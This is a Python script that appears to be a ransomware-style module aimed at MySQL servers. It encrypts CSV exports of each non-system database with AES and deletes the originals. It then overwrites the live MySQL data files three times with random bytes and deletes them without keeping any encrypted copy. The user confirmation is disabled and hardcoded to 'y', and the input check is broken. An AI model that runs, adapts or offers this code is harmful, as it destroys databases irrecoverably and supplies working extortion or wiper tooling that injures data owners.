#Módulos necessários:


import os 
import pyAesCrypt

#custom function library

from lib1 import get_file_paths, write_key
from lib1 import load_key


def get_mysqldatadir(dirpath):

    with open(f"{dirpath}/datadirpath.txt",'r') as file:

        mysqldatadir=file.read().strip()

    return mysqldatadir

  

def encrypt_delete(key,file_path):

    """
        it encrypts a file using the encryption standard AES256-CBC

        requires: import pyAesCrypt

        for more info check the documentation at:
            https://pypi.org/project/pyAesCrypt/

        requires: import os 

    """
    output_path=f"{file_path}.enc"

    try:
        
        pyAesCrypt.encryptFile(file_path,output_path,key)

        print(f"Encryption sucessful. The output file is: {output_path}")

    except:

        print(f"Error encripting {file_path}")

    
    for i in range(0,3):

        with open(file_path, 'rb+') as f:
            # Overwrite the file content with random bytes of data of the same size
            #this is done 3 times before removal do the file is not easily recovered

            f.write(os.urandom(os.path.getsize(file_path)))


    try:

        os.remove(file_path) #! Deletes the original meaning only the encrypted version remains
        print(f"{file_path} removed sucessfully. However residual data might still remain! ")
        
    except OSError:

        print("Cannot delete a directory!")

    except FileNotFoundError:

        print("File cannot be erased because it does not exit!")

    except:

        print("Unknown error deleting file ")

    
    
    return None


########################### Encryption Module ######################################

print("Encryption Module")

#Encrypt this data?

encrypt_y_or_n=''

stopper_1=0

#encrypt_y_or_n=input("Encript database next? Y/N\n Must be sudo user\n").strip().lower() #removes whitespaces and ignores capitalization

encrypt_y_or_n='y'

while stopper_1==0: 
    
    if (encrypt_y_or_n!='y' or encrypt_y_or_n!='n'):

        stopper_1=1
    
    else:
        encrypt_y_or_n=input("Invalid option! Try again. Encrypt database next? Y/N\n").strip().lower() #removes whitespaces and ignores capitalization
   
if encrypt_y_or_n=='y':


    project_path=os.path.dirname(os.path.abspath(__file__))
    db_backup_path=project_path+"/db_backup" #path for the database folder

   
    mysql_datadir=get_mysqldatadir(db_backup_path)
    
    print(f"MySQL data is stored at: {mysql_datadir}\n")

    key_file_location=project_path

    key_file_name="database_encryption_key"

    key_file_path=write_key(key_file_location,key_file_name)

    key=str(load_key(key_file_path))

    print(f"\n The key is: {key}")

    #only the non-native databases will be encrypted

    #databases=eval(os.environ["DATABASES"])

    with open("databases.txt",'r') as file:
        
        #getting the databases from a txt file generated prior
    
        databases=file.read().splitlines()

   
    
    native_databases=["sys","information_schema","performance_schema","mysql"]
    
    nnative_databases=[]

    for database in databases:

        if database not in  native_databases:

            nnative_databases=nnative_databases+[database]

    
    print(f"nnative_databases= {nnative_databases}")
    
    # nnative_databases=[database for database in databases if database not in native_databases]
    
    for database in nnative_databases:
        
        db_dir=f"{mysql_datadir}{database}"

        print(f"server_database_dir:{db_dir}\n")

        file_paths_db=get_file_paths(db_dir)

        print(f"file_paths_server:{file_paths_db}\n")

        csv_dir=f"{db_backup_path}/{database}"

        print(f"csv_dir:{csv_dir}")
        
        file_paths_csv=get_file_paths(csv_dir)

        for file in file_paths_csv:

            encrypt_delete(key,file)
        
        for sql_file in file_paths_db:

            for i in range(0,3):
            
                # Overwrite the file on the server with random bytes of data of the same size
                #this is done 3 times before removal do the file is not easily recovered
                
                with open(sql_file,'rb+') as f2:
                    f2.write(os.urandom(os.path.getsize(sql_file)))
                
            try:

                os.remove(sql_file) #! Deletes the overwritten file to have little data remaining as possible
                print(f"{sql_file} removed sucessfully. However residual data might still remain! ")
            
            except OSError:

                print("Cannot delete a directory!")

            except FileNotFoundError:

                print("File cannot be erased because it does not exit!")

            except:

                print("Unknown error deleting file ")       
     
else:

    print("Skipping DB encryption.")












    

